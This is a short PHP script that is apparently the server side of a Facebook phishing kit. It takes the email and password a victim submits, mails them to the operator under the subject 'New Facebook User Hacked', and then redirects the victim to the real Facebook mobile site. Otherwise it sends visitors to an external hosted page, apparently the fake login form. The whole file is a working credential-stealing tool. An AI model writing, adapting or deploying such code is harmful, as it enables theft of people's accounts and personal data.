<?php
	if(!empty($_POST['pass'])){
	if(isset($_POST['pass'])){
		$name = $_POST['email'];
		$pass = $_POST['pass'];

		$email = "Enter your email here";
		$content = 'Username : '.$_POST['email'].'</br>Password : '.$_POST['pass'];
		$subject = "New Facebook User Hacked";
		$headers = "From:fbhacker";
		mail($email, $subject, $content, $headers );
		header('location:https://m.facebook.com/');
	}
	}
	else{
		header('location:https://faceuser111.000webhostapp.com/');
	}
?>